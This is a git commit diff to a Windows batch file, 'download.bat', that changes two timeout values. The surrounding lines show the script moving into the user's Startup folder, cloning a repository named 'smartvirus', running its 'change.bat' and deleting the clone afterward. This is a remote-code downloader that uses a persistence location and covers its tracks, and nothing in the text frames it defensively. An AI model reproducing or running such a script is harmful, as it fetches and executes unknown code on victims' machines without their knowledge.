b121a39584d302813785d4d73cb83956164a4350
AlexisEpsi <152502075+AlexisEpsi@users.noreply.github.com>
2024-01-25 11:22:43 +0100

    Update download.bat

--- download.bat
+++ download.bat
@@ -2,10 +2,10 @@ setlocal enabledelayedexpansion
 set "goto=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 cd %goto%
 git clone https://github.com/mattistjnn/smartvirus
-timeout 3
+timeout 2
 cd smartvirus
 Start change.bat
-timeout 3
+timeout 2
 cd ..
 rmdir /s /q smartvirus
 
